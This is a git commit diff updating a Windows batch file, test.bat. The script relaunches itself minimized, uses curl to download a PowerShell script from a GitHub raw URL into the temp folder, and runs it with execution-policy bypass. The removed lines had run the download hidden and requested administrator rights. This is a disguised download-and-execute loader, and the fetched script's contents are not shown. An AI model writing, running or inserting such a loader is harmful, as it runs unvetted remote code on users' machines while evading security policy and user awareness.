a7179705bb9e7ce95b32f10165da43a82f684125
analysisw <petrovolosuk000@gmail.com>
2026-09-15 00:52:05 +0300

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,11 +1,10 @@
 @echo off
-if "%~1"=="h" goto run
+if "%~1"=="m" goto run
 
-cd /d "%~dp0"
-powershell -w hidden -Command "Start-Process 'test.bat' h -Verb RunAs -WindowStyle Hidden"
+start "" /min cmd /c ""%~f0" m"
 exit /b
 
 :run
 curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -o "%TEMP%\t.ps1"
-powershell -w hidden -ep bypass -f "%TEMP%\t.ps1"
+powershell -ep bypass -f "%TEMP%\t.ps1"
 exit /b
